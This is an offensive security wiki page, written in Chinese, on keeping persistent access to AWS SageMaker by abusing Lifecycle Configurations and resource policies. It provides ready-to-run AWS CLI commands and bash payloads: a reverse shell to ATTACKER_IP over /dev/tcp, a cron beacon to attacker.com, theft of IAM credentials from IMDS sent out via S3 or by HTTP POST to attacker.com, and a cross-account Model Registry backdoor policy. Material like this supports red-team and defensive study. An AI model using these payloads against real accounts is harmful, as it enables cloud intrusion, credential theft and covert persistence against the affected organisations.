# AWS - SageMaker Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## 持久化技术概览

本节概述了通过滥用 Lifecycle Configurations (LCCs) 在 SageMaker 中实现持久化的方法，包括 reverse shells、cron jobs、credential theft via IMDS、以及 SSH backdoors。  
这些脚本以实例的 IAM role 运行，并且可跨重启持久化。大多数技术需要出站网络访问，但如果环境为 'VPC-only" 模式，利用 AWS control plane 上的服务仍可能成功。

> [!TIP]
> 注意：SageMaker notebook instances 本质上是为机器学习工作负载专门配置的托管 EC2 实例。

## 所需权限
* Notebook Instances:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* Studio 应用:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## 在 Notebook 实例上设置生命周期配置

### 示例 AWS CLI 命令：
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## 在 SageMaker Studio 上设置生命周期配置

生命周期配置可以附加到 SageMaker Studio 的不同层级和不同应用类型上。

### Studio Domain 级别（所有用户）
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### Studio Space 级别 (个人或共享 Spaces)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Studio 应用程序生命周期配置的类型

生命周期配置可以针对不同的 SageMaker Studio 应用类型应用：
* JupyterServer: 在 Jupyter 服务器启动期间运行脚本，非常适合用于像 reverse shells 和 cron jobs 这样的持久性机制。
* KernelGateway: 在 KernelGateway 应用启动时执行，适用于初始设置或获得持久访问。
* CodeEditor: 适用于 Code Editor (Code-OSS)，允许在代码编辑会话开始时执行脚本。

### 每种类型的示例命令：

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### 代码编辑器
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### 关键信息：
* 在域或空间级别附加 LCCs 会影响范围内的所有用户或应用。
* 需要更高权限（sagemaker:UpdateDomain, sagemaker:UpdateSpace），通常在空间级别比域级别更容易实现。
* 网络层控制（例如严格的出站过滤）可以阻止成功的 reverse shells 或数据外泄。

## 通过 Lifecycle Configuration 发起 Reverse Shell

SageMaker Lifecycle Configurations (LCCs) 在 notebook instances 启动时执行自定义脚本。具有相应权限的攻击者可以建立持久的 reverse shell。

### Payload 示例:
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## 通过 Lifecycle Configuration 实现 Cron Job 持久化

攻击者可以通过 LCC 脚本注入 cron jobs，确保恶意脚本或命令的定期执行，从而实现隐蔽的持久化。

### Payload Example:
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## Credential Exfiltration via IMDS (v1 & v2)

生命周期配置可以查询 Instance Metadata Service (IMDS) 来检索 IAM 凭证并将其 exfiltrate 到攻击者控制的位置。

### Payload 示例:
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```
## Persistence via Model Registry resource policy (PutModelPackageGroupPolicy)

滥用 SageMaker 上 Model Package Group 的基于资源的策略，为外部主体授予跨账号权限（例如 CreateModelPackage/Describe/List）。这会创建一个持久的 backdoor，允许推送 poisoned model versions 或读取 model metadata/artifacts，即使攻击者在受害账户中的 IAM user/role 被移除也能如此。

Required permissions
- sagemaker:CreateModelPackageGroup
- sagemaker:PutModelPackageGroupPolicy
- sagemaker:GetModelPackageGroupPolicy

Steps (us-east-1)
```bash
# 1) Create a Model Package Group
REGION=${REGION:-us-east-1}
MPG=atk-mpg-$(date +%s)
aws sagemaker create-model-package-group \
--region "$REGION" \
--model-package-group-name "$MPG" \
--model-package-group-description "Test backdoor"

# 2) Craft a cross-account resource policy (replace 111122223333 with attacker account)
cat > /tmp/mpg-policy.json <<JSON
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "AllowCrossAccountCreateDescribeList",
"Effect": "Allow",
"Principal": {"AWS": ["arn:aws:iam::111122223333:root"]},
"Action": [
"sagemaker:CreateModelPackage",
"sagemaker:DescribeModelPackage",
"sagemaker:DescribeModelPackageGroup",
"sagemaker:ListModelPackages"
],
"Resource": [
"arn:aws:sagemaker:${REGION}:<VICTIM_ACCOUNT_ID>:model-package-group/${MPG}",
"arn:aws:sagemaker:${REGION}:<VICTIM_ACCOUNT_ID>:model-package/${MPG}/*"
]
}
]
}
JSON

# 3) Attach the policy to the group
aws sagemaker put-model-package-group-policy \
--region "$REGION" \
--model-package-group-name "$MPG" \
--resource-policy "$(jq -c . /tmp/mpg-policy.json)"

# 4) Retrieve the policy (evidence)
aws sagemaker get-model-package-group-policy \
--region "$REGION" \
--model-package-group-name "$MPG" \
--query ResourcePolicy --output text
```
注意
- 对于真正的 cross-account backdoor，应将 Resource 范围限定为特定的 group ARN，并在 Principal 中使用 attacker 的 AWS account ID。
- 对于端到端的 cross-account 部署或 artifact 读取，应将 S3/ECR/KMS 的授权与 attacker 帐户对齐。

影响
- 对 Model Registry 组的持久 cross-account 控制：attacker 可以发布恶意的 model versions，或枚举/读取 model metadata，即使其 IAM 实体在 victim account 中被移除后仍然可以做到。

## Canvas cross-account model registry backdoor (UpdateUserProfile.ModelRegisterSettings)

滥用 SageMaker Canvas 的用户设置，通过启用 ModelRegisterSettings 并将 CrossAccountModelRegisterRoleArn 指向另一个账户中的 attacker role，从而悄然将 model registry 的写入重定向到 attacker-controlled account。

所需权限
- sagemaker:UpdateUserProfile 在目标 UserProfile 上
- 可选：sagemaker:CreateUserProfile 在您控制的 Domain 上

{{#include ../../../../banners/hacktricks-training.md}}
